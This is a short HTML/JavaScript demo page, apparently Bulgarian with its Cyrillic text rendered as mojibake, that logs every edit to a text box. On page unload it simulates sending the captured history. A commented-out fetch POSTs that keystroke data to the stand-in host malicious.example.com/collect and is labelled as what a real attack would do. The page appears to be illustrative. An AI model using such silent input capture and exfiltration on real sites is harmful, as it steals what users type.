<!DOCTYPE html>
<html lang="bg">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ—Å–ª–µ–¥—è–≤–∞–Ω–µ + –ò–∑–ø—Ä–∞—â–∞–Ω–µ</title>
  <style>
    body { font-family: sans-serif; margin: 2rem; }
    textarea { width: 100%; height: 100px; }
    pre { background: #f0f0f0; padding: 1rem; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>–î–µ–º–æ: –°–ª–µ–¥–µ–Ω–µ –∏ –∏–∑–ø—Ä–∞—â–∞–Ω–µ</h1>
  <p>–í—ä–≤–µ–¥–∏ —Ç–µ–∫—Å—Ç, –∏–∑—Ç—Ä–∏–π –≥–æ, –ø—Ä–æ–º–µ–Ω—è–π ‚Äì –≤—Å–µ–∫–∏ –º–æ–º–µ–Ω—Ç —Å–µ –∑–∞–ø–∏—Å–≤–∞. –ù–∞ –∫—Ä–∞—è —â–µ —Å–µ ‚Äû–∏–∑–ø—Ä–∞—Ç–∏‚Äú –∫—ä–º —Å—ä—Ä–≤—ä—Ä (—Å–∞–º–æ –≤ –∫–æ–Ω–∑–æ–ª–∞—Ç–∞).</p>

  <textarea id="userInput" placeholder="–í—ä–≤–µ–¥–∏ —Ç—É–∫..."></textarea>

  <h3>–õ–æ–∫–∞–ª–Ω–æ —Å–ª–µ–¥–µ–Ω–∞ –∏—Å—Ç–æ—Ä–∏—è:</h3>
  <pre id="log"></pre>

  <script>
    const input = document.getElementById('userInput');
    const log = document.getElementById('log');
    const history = [];

    input.addEventListener('input', (e) => {
      const currentValue = e.target.value;
      history.push(currentValue);
      log.textContent = history.map((v, i) => `[${i + 1}] ${v}`).join('\n');
    });

    window.addEventListener('beforeunload', () => {
      const payload = {
        timestamp: new Date().toISOString(),
        sessionData: history,
      };

      // üîí –í —Ä–µ–∞–ª–Ω–∞ –∞—Ç–∞–∫–∞ —Ç–æ–≤–∞ –º–æ–∂–µ –¥–∞ —Å–µ –∏–∑–ø—Ä–∞—Ç–∏ –∫–∞—Ç–æ POST:
      // fetch('https://malicious.example.com/collect', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify(payload)
      // });

      console.warn('‚ö†Ô∏è –ü—Ä–∞—â–∞–Ω–µ –Ω–∞ –∑–∞–ø–∏—Å–∞–Ω–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –∫—ä–º —Å—ä—Ä–≤—ä—Ä (—Å–∏–º—É–ª–∏—Ä–∞–Ω–æ):');
      console.log(JSON.stringify(payload, null, 2));
    });
  </script>
</body>
</html>
